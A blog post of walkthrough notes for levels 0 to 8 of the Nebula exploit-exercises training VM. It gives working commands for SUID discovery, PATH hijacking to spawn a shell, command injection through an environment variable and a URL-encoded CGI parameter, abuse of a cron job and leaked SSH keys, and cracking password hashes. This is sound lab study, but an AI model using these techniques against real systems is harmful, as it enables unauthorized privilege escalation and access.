---
layout: post
title: Nebula Notes
---

This is my notes for the Nebula VM.

https://exploit-exercises.com/nebula/

## Level 0

Find suids: `find / -perm -4000 2>/dev/null` 

## Level 1

We need to exploit a SUID to execute arbitrary code. We are given the source, the exploitable line is.

`system("/usr/bin/env echo and now what?")`

`env` in this context is used to reference a user's path.

If we `echo $PATH` we get
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
Which means the program searches through these directories in order to find our executable, in this instance, `echo`.

We add another directory to path
```bsh
level01@nebula:/home/flag01$ PATH=/tmp:$PATH
```
And place an executable in there called `echo` like
```bsh
#!/bin/sh

/bin/sh
```
Then running the `flag01` SUID executable gives us a shell as user flag01.

## Level 2

Ok I love this VM.

Vulnerable code is 

```c
 buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
```
So we set our $USER
```bsh
level02@nebula:/home/flag02$ export USER='; /bin/sh #'
```
Run the executable and get a shell as flag02

## Level 3

This level runs the below script with a cronjob.

```bsh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Looking at the script it seems to run any executable in the writable.d directory.
Let's write a script to get the flag
```
#/bin/sh

/bin/getflag >> /tmp/flag03/flag
```
Make sure to set permissions/executable then wait for the cron to run.

## Level 4

Create a symlink

```
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/level04
```
Pass the sl as arg to the executable. Use the output to `su flag04` then `getflag`

## Level 5

```
level05@nebula:/home/flag05$ mkdir /tmp/flag05
level05@nebula:/home/flag05$ cd /tmp/flag05
/tmp/flag05$ tar -xvzf /home/flag05/.backup/backup-19072011.tgz -C .
level05@nebula:/tmp/flag05$ cd .ssh/
level05@nebula:/tmp/flag05/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
level05@nebula:/tmp/flag05/.ssh$ ssh flag05@nebula -i id_rsa
flag05@nebula:~$ getflag
```

## Level 6

```
cat /etc/passwd/
```
Crack the hash with john

## Level 7

So this line

```
ping(param("Host"));
```
means we invoke the program like
```
level07@nebula:/home/flag07$ ./index.cgi Host=127.0.0.1
```
We can passthrough our own commands using a semicolon, but the program isn't SUID so it doesn't really help.

The other file in `/home/flag07/` is the config for a web server that looks like it runs on port 7007. Let's break out nc and see if we can reach it.

```
level07@nebula:/home/flag07$ netcat 127.0.0.1 7007
GET /index.cgi?Host=127.0.0.1%3Bwhoami
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.015/0.035/0.046/0.015 ms
flag07
```
Note te %3B HTML encoding for the semi colon. The webserver runs as flag07, so we can execute our getflag through injecting the right param. 
```
GET /index.cgi?Host=127.0.0.1%3Bgetflag
Content-type: text/html

...

You have successfully executed getflag on a target account
```

## Level 08

We have a packet capture file we can read with tcpdump

Using the below flags makes it sort of readable.
```
tcpdump -qns 0 -X -r capture.pcap
```
We can see an attempted login to `wwwbugs.log` with a password field.